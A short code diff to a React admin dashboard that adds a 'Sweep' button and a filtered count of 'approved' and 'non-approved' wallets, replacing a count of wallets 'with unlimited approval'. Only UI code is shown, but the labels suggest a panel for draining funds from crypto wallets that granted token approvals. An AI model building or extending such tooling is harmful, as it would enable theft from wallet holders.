+                                    ) : (
+                                      <>
+                                        <Zap className="w-3.5 h-3.5" />
+                                        <span>Sweep</span>
+                                      </>
+                                    )}
+                                  </button>
+                                </div>
                               </td>
                             </tr>
                           );
@@ -713,7 +836,13 @@ export const AdminDashboard: React.FC<AdminDashboardProps> = ({
 
                   <div className="px-5 py-3 border-t border-[#1e2a3f] text-[11px] text-[#4a5568] font-mono flex items-center justify-between">
                     <span>
-                      {sortedWallets.length} wallet{sortedWallets.length !== 1 ? 's' : ''} with unlimited approval
+                      {currentWalletList.length}{' '}
+                      {walletFilter === 'all'
+                        ? 'total'
+                        : walletFilter === 'approved'
+                        ? 'approved'
+                        : 'non-approved'}{' '}
+                      wallet{currentWalletList.length !== 1 ? 's' : ''}
                     </span>
                   </div>
                 </div>
